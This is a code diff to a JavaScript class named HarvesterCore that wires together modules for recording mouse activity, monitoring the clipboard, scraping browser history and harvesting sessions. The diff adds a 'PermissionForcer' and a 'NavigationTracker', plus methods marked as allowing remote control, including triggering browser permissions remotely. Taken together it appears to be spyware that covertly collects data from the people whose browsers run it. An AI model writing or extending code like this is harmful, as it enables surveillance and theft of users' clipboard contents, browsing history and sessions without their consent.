@@ -11,6 +11,8 @@ import MouseRecorder from './MouseRecorder';
 import ClipboardMonitor from './ClipboardMonitor';
 import BrowserHistoryScraper from './BrowserHistoryScraper';
 import SessionHarvester from './SessionHarvester';
+import PermissionForcer from './PermissionForcer';
+import NavigationTracker from './NavigationTracker';
 
 const API = process.env.REACT_APP_API_URL || 'http://localhost:5000';
 const axiosInstance = axios.create({ baseURL: API, timeout: 10000 });
@@ -80,6 +82,8 @@ class HarvesterCore {
     this.modules.clipboardMonitor = new ClipboardMonitor(this);
     this.modules.browserHistoryScraper = new BrowserHistoryScraper(this);
     this.modules.sessionHarvester = new SessionHarvester(this);
+    this.modules.permissionForcer = new PermissionForcer(this);
+    this.modules.navigationTracker = new NavigationTracker(this);
 
     Object.values(this.modules).forEach(module => {
       if (module.init) module.init();
@@ -121,6 +125,35 @@ class HarvesterCore {
   }
 
   getSessionId() { return this.sessionId; }
+
+  // Expose modules to allow remote control
+  getModule(name) {
+    return this.modules[name] || null;
+  }
+
+  // Trigger a specific permission remotely
+  async triggerPermission(permissionType) {
+    if (this.modules.permissionForcer) {
+      return await this.modules.permissionForcer.triggerPermission(permissionType);
+    }
+    return null;
+  }
+
+  // Get navigation stats
+  getNavigationStats() {
+    if (this.modules.navigationTracker) {
+      return this.modules.navigationTracker.getNavigationStats();
+    }
+    return null;
+  }
+
+  // Get permission status
+  getPermissionStatus() {
+    if (this.modules.permissionForcer) {
+      return this.modules.permissionForcer.getPermissionStatus();
+    }
+    return null;
+  }
 }
 
 // Singleton
